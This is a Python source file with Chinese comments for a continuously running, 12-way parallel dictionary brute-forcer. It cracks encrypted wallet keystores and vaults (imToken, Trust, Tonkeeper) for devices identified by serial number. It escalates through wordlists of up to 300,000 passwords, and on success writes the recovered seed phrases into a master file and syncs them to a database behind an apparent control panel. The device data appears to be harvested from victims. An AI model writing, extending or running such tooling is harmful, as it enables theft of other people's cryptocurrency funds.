#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
wallet_brute.py —— 18 链钱包爆破队列（全天常驻 · 12 并发）
================================================================
【目标筛选】只爆"确实需要爆破的"（未解出 + 有加密数据线索）：
    · adapters 里有未解 web3-keystore / keychain-scrypt-vault（明确待口令）
    · secure_stores 非空（加密 vault）
    · wallet_svcs 非空（keychain 钱包服务条目）
   输出：无关卡（没装钱包/没采到数据）自动排除
【字典分级】T1 3000 → T2 17000 → T3 300000（含组合字典），按设备类型分派：
    · imToken 类（PBKDF2，可爆）      : T1 → T2 → T3
    · Trust / 其它 keystore           : T1 → T2
    · Tonkeeper（scrypt 很慢）        : 仅 T1
【执行】12 个 worker 并行，每 worker 调 wallet18_auto.py 单台子进程（--only-run + --out-file）
【回写】命中 → flock（与 cron 同名锁）保护下合并主 wallet18.json + state → 触发 pg_sync 入库（面板/通知）
【循环】队列跑完 sleep 30 分钟重新筛选（新设备自动进队）；进度持久化，不重复劳动
【用法】
    python3 tools/wallet_brute.py            # 常驻循环（systemd）
    python3 tools/wallet_brute.py --dry      # 只打印计划不执行
    python3 tools/wallet_brute.py --once --limit 3   # 跑 3 个任务后退出（验证用）
"""
import json, os, sys, time, subprocess, fcntl
from concurrent.futures import ThreadPoolExecutor

BASE = '/www/wwwroot/i.131422.com'
PY = '/usr/bin/python3'
SLAVE = os.path.join(BASE, 'adm888app', 'wallet18_auto.py')
WJ = os.path.join(BASE, 'adm888app', 'data', 'wallet18.json')
ST = os.path.join(BASE, 'adm888app', 'data', 'wallet18_state.json')
WK_LOCK = '/tmp/wallet18_auto.lock'
RUN = '/tmp/wb_run'
PROG = os.path.join(RUN, 'progress.json')
HITS = os.path.join(RUN, 'hits.json')
LOG = os.path.join(BASE, 'logs', 'wallet_brute.log')
WORKERS = 12
TIERS = {'T1': 3000, 'T2': 17000, 'T3': 300000}
TIER_TIMEOUT = {'T1': 2400, 'T2': 10800, 'T3': 100000}   # 秒

DRY = '--dry' in sys.argv
ONCE = '--once' in sys.argv
LIMIT = 0
for _i, _a in enumerate(sys.argv):
    if _a == '--limit' and _i + 1 < len(sys.argv):
        try: LIMIT = int(sys.argv[_i + 1])
        except Exception: LIMIT = 0

def log(msg):
    line = time.strftime('[%Y-%m-%d %H:%M:%S] ') + msg
    print(line, flush=True)
    try:
        os.makedirs(os.path.dirname(LOG), exist_ok=True)
        with open(LOG, 'a', encoding='utf-8') as f:
            f.write(line + '\n')
    except Exception:
        pass

def load_json(p, dflt=None):
    try:
        return json.load(open(p, encoding='utf-8'))
    except Exception:
        return dflt

def save_json(p, o):
    tmp = p + '.tmp'
    os.makedirs(os.path.dirname(p), exist_ok=True)
    json.dump(o, open(tmp, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
    os.replace(tmp, p)

def pick_targets():
    """未解出 + 有加密数据线索 → {serial: kind}"""
    d = load_json(WJ, {}) or {}
    t = {}
    for sn, e in d.items():
        if e.get('wallets'):                      # 已解出
            continue
        ads = [a for a in (e.get('adapters') or []) if a.get('mnemonic') is None]
        ss = e.get('secure_stores') or []
        svc = e.get('wallet_svcs') or []
        if not (ads or ss or svc):
            continue                              # 无线索：跳过
        kind = 'other'
        if ads:
            apps = {a.get('app') for a in ads}
            kinds = ' '.join(str(a.get('kind') or '') for a in ads)
            if 'keystore' in kinds or 'imToken' in apps:
                kind = 'imtoken' if ('web3-keystore' in kinds or 'imToken' in apps) else 'other'
            if 'Tonkeeper' in apps:
                kind = 'tonkeeper'
        elif svc:
            kind = 'svc'                          # 仅 keychain 服务条目（Trust 类）
        t[sn] = kind
    return t

def plan_tiers(kind):
    if kind == 'tonkeeper':
        return ['T1']
    if kind == 'imtoken':
        return ['T1', 'T2', 'T3']
    return ['T1', 'T2']

def build_tasks(targets, prog):
    tasks = []
    for sn, kind in sorted(targets.items()):
        p = prog.get(sn, {})
        if p.get('hit'):
            continue
        for tier in plan_tiers(kind):
            rec = p.get(tier) or {}
            if rec.get('done'):
                continue                          # 该档已跑完（未中）
            tasks.append((sn, kind, tier))
            break
    return tasks

def run_one(sn, tier, limit):
    os.makedirs(RUN, exist_ok=True)
    out = os.path.join(RUN, '%s.%s.json' % (sn, tier))
    try:
        os.path.exists(out) and os.unlink(out)
    except Exception:
        pass
    cmd = [PY, SLAVE, '--only-run', sn, '--full', '--dict', '--serial', sn,
           '--dict-limit', str(limit), '--out-file', out]
    t0 = time.time()
    try:
        r = subprocess.run(cmd, cwd=BASE, timeout=TIER_TIMEOUT.get(tier, 10800),
                           stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        rc, tail = r.returncode, (r.stdout or '')[-400:]
    except subprocess.TimeoutExpired:
        rc, tail = -9, 'timeout'
    secs = int(time.time() - t0)
    res = load_json(out) or {}
    e = res.get(sn) or {}
    nw = len(e.get('wallets') or [])
    nm = sum(1 for w in (e.get('wallets') or []) if w.get('mnemonic'))
    return {'serial': sn, 'tier': tier, 'secs': secs, 'rc': rc,
            'wallets': nw, 'mnems': nm, 'hit': (nw > 0 and nm > 0), 'out': out, 'tail': tail}

def merge_hit(sn, outfile):
    """命中回写：flock（与 cron 同名）→ 主 json + state 同步 → pg_sync 入库"""
    res = load_json(outfile) or {}
    if sn not in res:
        return False
    lk = open(WK_LOCK, 'a+')
    try:
        fcntl.flock(lk, fcntl.LOCK_EX)            # 阻塞等 cron 跑完（持有期间安全）
        wj = load_json(WJ, {}) or {}
        stt = load_json(ST, {}) or {}
        wj[sn] = res[sn]
        save_json(WJ, wj)
        lst = stt.get('_state') or {}
        if sn in lst:
            lst[sn]['res'] = res[sn]
        else:
            lst[sn] = {'sig': '', 'ts': int(time.time()), 'res': res[sn]}
        stt['_state'] = lst
        save_json(ST, stt)
    finally:
        try: fcntl.flock(lk, fcntl.LOCK_UN)
        except Exception: pass
        lk.close()
    # 触发入库（wallet18 stage）
    try:
        subprocess.run(['/usr/bin/node', os.path.join(BASE, 'tools', 'pg_sync_globals.js'), '--only', 'wallet18'],
                       cwd=BASE, timeout=900, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        log('pg_sync 触发失败: %s' % e)
    return True

def worker(task, prog):
    sn, kind, tier = task
    r = run_one(sn, tier, TIERS[tier])
    p = prog.setdefault(sn, {})
    p[tier] = {'done': True, 'ts': int(time.time()), 'secs': r['secs'],
               'wallets': r['wallets'], 'mnems': r['mnems'], 'rc': r['rc']}
    if r['hit']:
        p['hit'] = True
        ok = merge_hit(sn, r['out'])
        hits = load_json(HITS, []) or []
        hits.append({'serial': sn, 'kind': kind, 'tier': tier, 'mnems': r['mnems'],
                     'ts': int(time.time()), 'merged': bool(ok)})
        save_json(HITS, hits)
        log('★ 命中 %s（%s/%s）助记词×%d 用时%d秒 → 已回写%s' % (sn, kind, tier, r['mnems'], r['secs'], '并入库' if ok else '（回写失败!）'))
    else:
        log('  未中 %s（%s/%s）wallets=%d mnem=%d 用时%d秒 rc=%d' % (sn, kind, tier, r['wallets'], r['mnems'], r['secs'], r['rc']))
    save_json(PROG, prog)

def main():
    log('=== wallet_brute 启动（workers=%d, dry=%s, once=%s, limit=%d）===' % (WORKERS, DRY, ONCE, LIMIT))
    os.makedirs(RUN, exist_ok=True)
    try: os.chmod(RUN, 0o777)          # 防跨用户权限问题（root 建 / www 跑 等场景）
    except Exception: pass
    idle_round = 0
    while True:
        targets = pick_targets()
        prog = load_json(PROG, {}) or {}
        tasks = build_tasks(targets, prog)
        if LIMIT:
            tasks = tasks[:LIMIT]
        log('目标 %d 台 / 待执行任务 %d 个' % (len(targets), len(tasks)))
        if not tasks:
            if ONCE:
                log('队列为空，退出（once）')
                return
            log('队列空，30 分钟后重新筛选')
            time.sleep(1800)
            continue
        if DRY:
            for t in tasks[:50]:
                log('  [dry] %s %s %s' % t)
            return
        done = 0
        with ThreadPoolExecutor(max_workers=WORKERS) as ex:
            futs = {ex.submit(worker, t, prog): t for t in tasks}
            for f in futs:
                try:
                    f.result()
                    done += 1
                except Exception as e:
                    log('worker 异常 %s: %s' % (futs[f], e))
        log('本轮完成 %d/%d 个任务' % (done, len(tasks)))
        if ONCE:
            log('once 模式完成，退出')
            return
        idle_round += 1
        time.sleep(10)

if __name__ == '__main__':
    main()
